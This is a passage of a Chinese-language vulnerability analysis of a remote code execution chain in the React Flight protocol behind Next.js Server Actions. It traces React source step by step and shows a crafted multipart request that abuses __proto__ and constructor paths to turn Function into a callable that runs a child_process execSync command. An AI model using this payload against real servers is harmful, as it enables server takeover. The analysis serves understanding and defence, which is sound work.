.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Next.js Server Actions RCE 漏洞分析</h2>
<h3 data-id="heading-1">摘要</h3>
<p>本文档深入分析了 React Flight 协议（React Server Actions 的底层协议）中的一个远程代码执行 (RCE) 漏洞。该利用链串联了<strong>三个关键漏洞</strong>：</p>
<ol>
<li>引用解析中的<strong>未过滤路径遍历</strong>（可访问 <code>__proto__</code> 和 <code>constructor</code>）。</li>
<li><strong>伪造 Chunk 注入</strong> —— 将精心构造的对象伪装成内部 Chunk 对象处理。</li>
<li><strong>Function 构造函数注入</strong> —— 将 <code>_formData.get</code> 方法替换为 <code>Function</code> 构造函数。</li>
</ol>
<hr/>
<h3 data-id="heading-2">目录</h3>
<ol>
<li><a href="#react-server-actions-%E7%AE%80%E4%BB%8B" title="#react-server-actions-%E7%AE%80%E4%BB%8B">React Server Actions 简介</a></li>
<li><a href="#react-flight-%E5%8D%8F%E8%AE%AE" title="#react-flight-%E5%8D%8F%E8%AE%AE">React Flight 协议</a></li>
<li><a href="#payload-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90" title="#payload-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90">Payload 反序列化深度解析</a></li>
<li><a href="#payload-%E8%AF%A6%E6%83%85" title="#payload-%E8%AF%A6%E6%83%85">Payload 详情</a></li>
<li><a href="#%E8%AF%A6%E7%BB%86%E4%BB%A3%E7%A0%81%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90" title="#%E8%AF%A6%E7%BB%86%E4%BB%A3%E7%A0%81%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90">详细代码路径分析</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B%E5%8F%AF%E8%A7%86%E5%8C%96" title="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B%E5%8F%AF%E8%A7%86%E5%8C%96">漏洞利用流程可视化</a></li>
<li><a href="#%E6%A0%B9%E5%9B%A0%E6%80%BB%E7%BB%93" title="#%E6%A0%B9%E5%9B%A0%E6%80%BB%E7%BB%93">根因总结</a></li>
</ol>
<hr/>
<h3 data-id="heading-3">React Server Actions 简介</h3>
<h4 data-id="heading-4">什么是 Server Actions？</h4>
<p>React Server Actions 是 React 18 引入并完全集成在 Next.js 13+ App Router 中的一项功能。它允许开发者定义<strong>服务端函数</strong>，并在客户端组件中直接调用，而无需显式创建 API 路由。</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// app/actions.js</span>
<span class="hljs-string">'use server'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">submitForm</span>(<span class="hljs-params">formData</span>) {
  <span class="hljs-keyword">const</span> name = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">'name'</span>)
  <span class="hljs-keyword">await</span> db.<span class="hljs-property">users</span>.<span class="hljs-title function_">create</span>({ name })
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> }
}
</code></pre>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// app/page.jsx</span>
<span class="hljs-keyword">import</span> { submitForm } <span class="hljs-keyword">from</span> <span class="hljs-string">'./actions'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Page</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">{submitForm}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"name"</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-5">Server Actions 的工作原理</h4>
<p>当 Server Action 被调用时：</p>
<pre><code class="hljs language-vbscript" lang="vbscript">┌─────────────────────────────────────────────────────────────────────────────┐
│                        <span class="hljs-built_in">SERVER</span> ACTION 流程                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   客户端 (Client)                  网络 (Network)              服务端 (<span class="hljs-built_in">Server</span>) │
│   ──────                           ───────                      ──────      │
│                                                                             │
│   <span class="hljs-number">1.</span> 用户提交表单                                                             │
│          │                                                                  │
│          ▼                                                                  │
│   <span class="hljs-number">2.</span> React 使用 Flight                                                       │
│      协议序列化参数               POST /                                      │
│                                   multipart/form-data       <span class="hljs-number">3.</span> <span class="hljs-keyword">Next</span>.js 接收  │
│   ─────────────────────────────►  <span class="hljs-keyword">Next</span>-Action: &lt;id&gt;              请求        │
│                                                                  │          │
│                                                                  ▼          │
│                                                           <span class="hljs-number">4.</span> 使用 Flight     │
│                                                              反序列化参数     │
│                                                                  │          │
│                                                                  ▼          │
│                                                           <span class="hljs-number">5.</span> 执行            │
│   <span class="hljs-number">7.</span> React 根据结果     ◄─────────────────────────────       <span class="hljs-built_in">Server</span> Action   │
│      更新 UI                  Flight 编码的响应                   │           │
│                                                                  ▼          │
│                                                           <span class="hljs-number">6.</span> 序列化返回值     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-6"><code>Next-Action</code> 标头</h4>
<p>当调用 Server Action 时，Next.js 会发送一个带有特殊标头的 POST 请求：</p>
<pre><code class="hljs language-http" lang="http">POST /page HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
Next-Action: 1234567890abcdef        ← Server Action 标识符
Next-Router-State-Tree: ...          ← 客户端路由状态
</code></pre>
<p><code>Next-Action</code> 标头告知服务器执行哪个已注册的函数。请求体包含序列化后的参数。</p>
<hr/>
<h3 data-id="heading-7">React Flight 协议</h3>
<h4 data-id="heading-8">概述</h4>
<p><strong>Flight 协议</strong> 是 React 的自定义序列化格式，用于在服务端和客户端之间传输 React 组件树和数据。它旨在处理：</p>
<ul>
<li>React 元素和组件</li>
<li>Promise 和异步数据</li>
<li>循环引用</li>
<li>二进制数据 (Blobs, TypedArrays)</li>
<li>服务端引用 (在服务端运行的函数)</li>
</ul>
<h4 data-id="heading-9">Flight 协议架构</h4>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────────────────────────┐
│                         FLIGHT 协议层级                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                     应用层 (Application Layer)                       │   │
│   │   Server Actions, React Server Components, 数据获取                  │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                        │
│                                    ▼                                        │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                    序列化层 (Serialization Layer)                    │   │
│   │                                                                     │   │
│   │   ReactFlightServer<span class="hljs-selector-class">.js</span> (服务端 → 客户端 编码)                         │   │
│   │   ReactFlightClient<span class="hljs-selector-class">.js</span> (客户端 → 服务端 解码)                         │   │
│   │   ReactFlightReplyServer<span class="hljs-selector-class">.js</span> (客户端 → 服务端 回复解码) ← 漏洞所在       │   │
│   │   ReactFlightReplyClient<span class="hljs-selector-class">.js</span> (服务端 → 客户端 回复编码)                 │   │
│   │                                                                     │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                        │
│                                    ▼                                        │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                     传输层 (Transport Layer)                         │   │
│   │   multipart/<span class="hljs-selector-tag">form</span>-data, ReadableStream, <span class="hljs-built_in">fetch</span>()                      │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-10">Flight 引用类型</h4>
<p>Flight 协议使用 <strong><code>$</code> 前缀的字符串</strong> 来编码纯 JSON 无法表示的特殊值：</p>











































































































<table><thead><tr><th>前缀</th><th>类型</th><th>示例</th><th>描述</th></tr></thead><tbody><tr><td><code>$$</code></td><td>转义 <code>$</code></td><td><code>"$$hello"</code> → <code>"$hello"</code></td><td>以 <code>$</code> 开头的字面量字符串</td></tr><tr><td><code>$@</code></td><td>Promise/Chunk</td><td><code>"$@0"</code></td><td>引用 Chunk ID 0</td></tr><tr><td><code>$F</code></td><td>服务端引用</td><td><code>"$F0"</code></td><td>服务端函数引用</td></tr><tr><td><code>$T</code></td><td>临时引用</td><td><code>"$T"</code></td><td>不透明的临时引用</td></tr><tr><td><code>$Q</code></td><td>Map</td><td><code>"$Q0"</code></td><td>位于 Chunk 0 的 Map 对象</td></tr><tr><td><code>$W</code></td><td>Set</td><td><code>"$W0"</code></td><td>位于 Chunk 0 的 Set 对象</td></tr><tr><td><code>$K</code></td><td>FormData</td><td><code>"$K0"</code></td><td>位于 Chunk 0 的 FormData</td></tr><tr><td><code>$B</code></td><td>Blob</td><td><code>"$B0"</code></td><td>位于 Chunk 0 的 Blob</td></tr><tr><td><code>$n</code></td><td>BigInt</td><td><code>"$n123"</code></td><td>BigInt 值</td></tr><tr><td><code>$D</code></td><td>Date</td><td><code>"$D2024-01-01"</code></td><td>Date 对象</td></tr><tr><td><code>$N</code></td><td>NaN</td><td><code>"$N"</code></td><td>NaN 值</td></tr><tr><td><code>$I</code></td><td>Infinity</td><td><code>"$I"</code></td><td>无穷大</td></tr><tr><td><code>$-</code></td><td>-Infinity/-0</td><td><code>"$-I"</code> 或 <code>"$-0"</code></td><td>负无穷或负零</td></tr><tr><td><code>$u</code></td><td>undefined</td><td><code>"$u"</code></td><td>undefined 值</td></tr><tr><td><code>$R</code></td><td>ReadableStream</td><td><code>"$R0"</code></td><td>ReadableStream</td></tr><tr><td><code>$0-9a-f</code></td><td>Chunk 引用</td><td><code>"$1"</code>, <code>"$a"</code></td><td>通过十六进制 ID 引用 Chunk</td></tr></tbody></table>
<h4 data-id="heading-11">基于 Chunk 的架构</h4>
<p>Flight 将数据组织成 <strong>Chunks (块)</strong> —— 可以相互引用的离散单元：</p>
<pre><code class="hljs language-css" lang="css">┌────────────────────────────────────────────────────────────────────────────┐
│                           CHUNK 结构                                       │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│   FormData 字段:                                                           │
│   ┌──────────────────────────────────────────────────────────────────┐     │
│   │  Field <span class="hljs-string">"0"</span>:  <span class="hljs-string">'{"name": "John", "ref": "$1"}'</span>     ← Chunk <span class="hljs-number">0</span>       │     │
│   │  Field <span class="hljs-string">"1"</span>:  <span class="hljs-string">'{"address": "123 Main St"}'</span>        ← Chunk <span class="hljs-number">1</span>       │     │
│   │  Field <span class="hljs-string">"2"</span>:  <span class="hljs-string">'"$@0"'</span>                             ← Chunk <span class="hljs-number">2</span>       │     │
│   └──────────────────────────────────────────────────────────────────┘     │
│                                                                            │
│   解析结果:                                                                 │
│   ┌──────────────────────────────────────────────────────────────────┐     │
│   │  Chunk <span class="hljs-number">0</span>: {name: <span class="hljs-string">"John"</span>, ref: → Chunk <span class="hljs-number">1</span>}                         │     │
│   │  Chunk <span class="hljs-number">1</span>: {<span class="hljs-selector-tag">address</span>: <span class="hljs-string">"123 Main St"</span>}                               │     │
│   │  Chunk <span class="hljs-number">2</span>: Promise&lt;Chunk <span class="hljs-number">0</span>&gt;                                       │     │
│   └──────────────────────────────────────────────────────────────────┘     │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-12">Chunk 对象（内部实现）</h4>
<p>在 React 内部，Chunk 被表示为具有类似 Promise 行为的对象：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 摘自 ReactFlightReplyServer.js (118-123行)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Chunk</span>(<span class="hljs-params">status, value, reason, response</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">status</span> = status;      <span class="hljs-comment">// 'pending' | 'blocked' | 'resolved_model' | 'fulfilled' | 'rejected'</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value;        <span class="hljs-comment">// 实际数据或挂起的监听器</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">reason</span> = reason;      <span class="hljs-comment">// 错误原因或 Chunk ID</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">_response</span> = response; <span class="hljs-comment">// 父级 Response 对象</span>
}

<span class="hljs-comment">// Chunks 继承自 Promise.prototype</span>
<span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">then</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">resolve, reject</span>) { <span class="hljs-comment">/* ... */</span> };
</code></pre>
<h4 data-id="heading-13">基于路径的引用（漏洞点）</h4>
<p>Flight 支持使用冒号分隔的路径进行<strong>嵌套属性访问</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-string">"<span class="hljs-variable">$0</span>:users:0:name"</span>
   │  │    │  │
   │  │    │  └── 属性 <span class="hljs-string">"name"</span>
   │  │    └───── 数组索引 0
   │  └────────── 属性 <span class="hljs-string">"users"</span>
   └───────────── Chunk ID 0
</code></pre>
<p><strong>解析过程：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 摘自 getOutlinedModel() - 602-616行</span>
<span class="hljs-keyword">const</span> path = reference.<span class="hljs-title function_">split</span>(<span class="hljs-string">':'</span>);  <span class="hljs-comment">// ["0", "users", "0", "name"]</span>
<span class="hljs-keyword">const</span> id = <span class="hljs-built_in">parseInt</span>(path[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>);   <span class="hljs-comment">// 0</span>
<span class="hljs-keyword">const</span> chunk = <span class="hljs-title function_">getChunk</span>(response, id);

<span class="hljs-keyword">let</span> value = chunk.<span class="hljs-property">value</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; path.<span class="hljs-property">length</span>; i++) {
  value = value[path[i]];  <span class="hljs-comment">// 遍历: value["users"]["0"]["name"]</span>
}
</code></pre>
<p><strong>🔴 漏洞所在：</strong> 对属性名称没有任何验证，允许：</p>
<ul>
<li><code>$0:__proto__:then</code> - 访问原型链</li>
<li><code>$0:constructor:constructor</code> - 访问 Function 构造函数</li>
</ul>
<hr/>
<h3 data-id="heading-14">Payload 反序列化深度解析</h3>
<details>
<summary>
本节将逐步追踪恶意 Payload 是如何被反序列化的。
点击查看详细的代码路径分析。
</summary>
<h4 data-id="heading-15">步骤 1: 接收 HTTP 请求</h4>
<pre><code class="hljs language-http" lang="http">POST / HTTP/1.1
Next-Action: x
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model",...}
------Boundary
Content-Disposition: form-data; name="1"

"$@0"
------Boundary
Content-Disposition: form-data; name="2"

[]
------Boundary--
</code></pre>
<h4 data-id="heading-16">步骤 2: FormData 解析</h4>
<p>Next.js 将 multipart body 解析为 FormData 对象：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 概念性表示</span>
formData = {
  <span class="hljs-string">"0"</span>: <span class="hljs-string">'{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{...}}'</span>,
  <span class="hljs-string">"1"</span>: <span class="hljs-string">'"$@0"'</span>,
  <span class="hljs-string">"2"</span>: <span class="hljs-string">'[]'</span>
}
</code></pre>
<h4 data-id="heading-17">步骤 3: Response 对象创建</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ReactFlightActionServer.js:62-67</span>
<span class="hljs-keyword">const</span> actionResponse = <span class="hljs-title function_">createResponse</span>(
  serverManifest,
  formFieldPrefix,    <span class="hljs-comment">// 例如 "" 或 "$ACTION_0:"</span>
  <span class="hljs-literal">undefined</span>,          <span class="hljs-comment">// temporaryReferences</span>
  body,               <span class="hljs-comment">// FormData</span>
);

<span class="hljs-comment">// 创建 Response 对象 (ReactFlightReplyServer.js:1091-1108)</span>
response = {
  <span class="hljs-attr">_bundlerConfig</span>: serverManifest,
  <span class="hljs-attr">_prefix</span>: formFieldPrefix,      <span class="hljs-comment">// 用于在 FormData 中查找 Chunk</span>
  <span class="hljs-attr">_formData</span>: body,               <span class="hljs-comment">// 原始 FormData</span>
  <span class="hljs-attr">_chunks</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(),            <span class="hljs-comment">// 解析后的 Chunk 缓存</span>
  <span class="hljs-attr">_closed</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-attr">_temporaryReferences</span>: <span class="hljs-literal">undefined</span>,
}
</code></pre>
<h4 data-id="heading-18">步骤 4: 获取 Root Chunk</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ReactFlightActionServer.js:69-72</span>
<span class="hljs-keyword">const</span> refPromise = <span class="hljs-title function_">getRoot</span>(actionResponse);

<span class="hljs-comment">// getRoot 返回 chunk 0 (ReactFlightReplyServer.js:177-180)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getRoot</span>(<span class="hljs-params">response</span>) {
  <span class="hljs-keyword">const</span> chunk = <span class="hljs-title function_">getChunk</span>(response, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 获取 ID 为 0 的 Chunk</span>
  <span class="hljs-keyword">return</span> chunk;  <span class="hljs-comment">// 作为 Thenable 返回 (具有 .then 方法)</span>
}
</code></pre>
<h4 data-id="heading-19">步骤 5: 从 FormData 查找 Chunk</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// getChunk (ReactFlightReplyServer.js:518-540)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getChunk</span>(<span class="hljs-params">response, id</span>) {
  <span class="hljs-keyword">const</span> chunks = response.<span class="hljs-property">_chunks</span>;
  <span class="hljs-keyword">let</span> chunk = chunks.<span class="hljs-title function_">get</span>(id);

  <span class="hljs-keyword">if</span> (!chunk) {
    <span class="hljs-keyword">const</span> prefix = response.<span class="hljs-property">_prefix</span>;
    <span class="hljs-keyword">const</span> key = prefix + id;                        <span class="hljs-comment">// "" + "0" = "0"</span>
    <span class="hljs-keyword">const</span> backingEntry = response.<span class="hljs-property">_formData</span>.<span class="hljs-title function_">get</span>(key);  <span class="hljs-comment">// 获取字段 "0"</span>

    <span class="hljs-keyword">if</span> (backingEntry != <span class="hljs-literal">null</span>) {
      <span class="hljs-comment">// 从 JSON 字符串创建 Chunk</span>
      chunk = <span class="hljs-title function_">createResolvedModelChunk</span>(response, backingEntry, id);
      <span class="hljs-comment">// chunk.status = 'resolved_model'</span>
      <span class="hljs-comment">// chunk.value = '{"then":"$1:__proto__:then",...}'</span>
      <span class="hljs-comment">// chunk._response = response</span>
    }
    chunks.<span class="hljs-title function_">set</span>(id, chunk);
  }
  <span class="hljs-keyword">return</span> chunk;
}
</code></pre>
<h4 data-id="heading-20">步骤 6: 通过 .then() 强制解析</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ReactFlightActionServer.js:75</span>
refPromise.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {});  <span class="hljs-comment">// 触发 Chunk.prototype.then</span>
</code></pre>
<h4 data-id="heading-21">步骤 7: Chunk.prototype.then 执行</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ReactFlightReplyServer.js:127-165</span>
<span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">then</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">resolve, reject</span>) {
  <span class="hljs-keyword">const</span> chunk = <span class="hljs-variable language_">this</span>;

  <span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'resolved_model'</span>:          <span class="hljs-comment">// 我们的 Chunk 匹配这个状态！</span>
      <span class="hljs-title function_">initializeModelChunk</span>(chunk);  <span class="hljs-comment">// 解析 JSON</span>
      <span class="hljs-keyword">break</span>;
  }

  <span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'fulfilled'</span>:
      <span class="hljs-title function_">resolve</span>(chunk.<span class="hljs-property">value</span>);         <span class="hljs-comment">// 返回解析后的值</span>
      <span class="hljs-keyword">break</span>;
  }
}
</code></pre>
<h4 data-id="heading-22">步骤 8: Model 初始化 (JSON 解析)</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// initializeModelChunk (ReactFlightReplyServer.js:446-501)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">initializeModelChunk</span>(<span class="hljs-params">chunk</span>) {
  <span class="hljs-keyword">const</span> resolvedModel = chunk.<span class="hljs-property">value</span>;
  <span class="hljs-comment">// = '{"then":"$1:__proto__:then","status":"resolved_model",...}'</span>

  <span class="hljs-keyword">const</span> rawModel = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(resolvedModel);
  <span class="hljs-comment">// = {then: "$1:__proto__:then", status: "resolved_model", ...}</span>

  <span class="hljs-keyword">const</span> value = <span class="hljs-title function_">reviveModel</span>(
    chunk.<span class="hljs-property">_response</span>,      <span class="hljs-comment">// Response 对象</span>
    {<span class="hljs-string">''</span>: rawModel},       <span class="hljs-comment">// 包装对象</span>
    <span class="hljs-string">''</span>,                   <span class="hljs-comment">// Key</span>
    rawModel,             <span class="hljs-comment">// 解析后的 JSON</span>
    rootReference         <span class="hljs-comment">// 引用路径</span>
  );
}
</code></pre>
<h4 data-id="heading-23">步骤 9: 递归还原 (处理属性)</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// reviveModel (ReactFlightReplyServer.js:386-442)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">reviveModel</span>(<span class="hljs-params">response, parentObj, parentKey, value, reference</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'string'</span>) {
    <span class="hljs-comment">// 处理 $ 前缀的特殊值</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">parseModelString</span>(response, parentObj, parentKey, value, reference);
  }

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span> &amp;&amp; value !== <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// 递归处理所有属性</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> value) {
      <span class="hljs-keyword">const</span> newValue = <span class="hljs-title function_">reviveModel</span>(
        response, value, key, value[key], childRef
      );
      value[key] = newValue;  <span class="hljs-comment">// 替换为解析后的值</span>
    }
  }
  <span class="hljs-keyword">return</span> value;
}
</code></pre>
<h4 data-id="heading-24">步骤 10: 处理 <code>$1:__proto__:then</code></h4>
<p>当还原值为 <code>"$1:__proto__:then"</code> 的 <code>then</code> 属性时：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// parseModelString (ReactFlightReplyServer.js:916-1089)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">parseModelString</span>(<span class="hljs-params">response, obj, key, value, reference</span>) {
  <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] === <span class="hljs-string">'$'</span>) {
    <span class="hljs-comment">// ... 各种 $X 情况 ...</span>

    <span class="hljs-comment">// 默认: 视为带路径的 Chunk 引用</span>
    <span class="hljs-keyword">const</span> ref = value.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// "1:__proto__:then"</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">getOutlinedModel</span>(response, ref, obj, key, createModel);
  }
}
</code></pre>
<h4 data-id="heading-25">步骤 11: 路径遍历 (漏洞核心)</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// getOutlinedModel (ReactFlightReplyServer.js:595-638)</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getOutlinedModel</span>(<span class="hljs-params">response, reference, parentObject, key, map</span>) {
  <span class="hljs-keyword">const</span> path = reference.<span class="hljs-title function_">split</span>(<span class="hljs-string">':'</span>);  <span class="hljs-comment">// ["1", "__proto__", "then"]</span>
  <span class="hljs-keyword">const</span> id = <span class="hljs-built_in">parseInt</span>(path[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>);   <span class="hljs-comment">// 1</span>
  <span class="hljs-keyword">const</span> chunk = <span class="hljs-title function_">getChunk</span>(response, id);  <span class="hljs-comment">// 获取 Chunk 1</span>

  <span class="hljs-comment">// Chunk 1 包含 "$@0" - 一个指向 Chunk 0 的引用</span>
  <span class="hljs-comment">// 解析后，chunk1.value = chunk0 (Chunk 对象本身)</span>

  <span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'fulfilled'</span>:
      <span class="hljs-keyword">let</span> value = chunk.<span class="hljs-property">value</span>;        <span class="hljs-comment">// Chunk 0 的 Chunk 对象</span>

      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; path.<span class="hljs-property">length</span>; i++) {
        value = value[path[i]];       <span class="hljs-comment">// 🔴 没有净化处理！</span>
      }
      <span class="hljs-comment">// path[1] = "__proto__"  →  value = Chunk.prototype</span>
      <span class="hljs-comment">// path[2] = "then"       →  value = Chunk.prototype.then (FUNCTION!)</span>

      <span class="hljs-keyword">return</span> <span class="hljs-title function_">map</span>(response, value);    <span class="hljs-comment">// 返回 .then 函数</span>
  }
}
</code></pre>
<h4 data-id="heading-26">步骤 12: 反序列化结果</h4>
<p>处理完毕后，Payload 对象变为：</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-attr">then</span>: <span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">then</span>,  <span class="hljs-comment">// 🔴 窃取的函数！</span>
  <span class="hljs-attr">status</span>: <span class="hljs-string">"resolved_model"</span>,
  <span class="hljs-attr">reason</span>: -<span class="hljs-number">1</span>,
  <span class="hljs-attr">value</span>: <span class="hljs-string">'{"then":"$B1337"}'</span>,
  <span class="hljs-attr">_response</span>: {
    <span class="hljs-attr">_prefix</span>: <span class="hljs-string">"process.mainModule.require('child_process').execSync('say haha');"</span>,
    <span class="hljs-attr">_chunks</span>: <span class="hljs-title class_">Map</span>,              <span class="hljs-comment">// 来自 $Q2</span>
    <span class="hljs-attr">_formData</span>: {
      <span class="hljs-attr">get</span>: <span class="hljs-title class_">Function</span>            <span class="hljs-comment">// 🔴 FUNCTION 构造函数！ (来自 $1:constructor:constructor)</span>
    }
  }
}
</code></pre>
<h4 data-id="heading-27">反序列化流程图解</h4>
<pre><code class="hljs language-ini" lang="ini">┌─────────────────────────────────────────────────────────────────────────────┐
│                       反序列化流程 (DESERIALIZATION FLOW)                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   HTTP 请求                                                                 │
│        │                                                                    │
│        ▼                                                                    │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ FormData 解析                                                       │   │
│   │   "0" → '{"then":"$1:__proto__:then",...}'                          │   │
│   │   "1" → '"$@0"'                                                     │   │
│   │   "2" → '<span class="hljs-section">[]</span>'                                                        │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│        │                                                                    │
│        ▼                                                                    │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │ createResponse()                                                     │  │
│   │   <span class="hljs-attr">response._formData</span> = FormData                                      │  │
│   │   <span class="hljs-attr">response._chunks</span> = Map()                                           │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│        │                                                                    │
│        ▼                                                                    │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │ getRoot() → getChunk(response, 0)                                    │  │
│   │   从字段 "0" 创建 ResolvedModelChunk                                  │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│        │                                                                    │
│        ▼                                                                    │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │ chunk.then(() =&gt; {})   ← 触发点                                      │  │
│   │   └── initializeModelChunk(chunk)                                    │  │
│   │         └── JSON.parse(chunk.value)                                  │  │
│   │         └── reviveModel(response, {...}, ...)                        │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│        │                                                                    │
│        ▼                                                                    │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
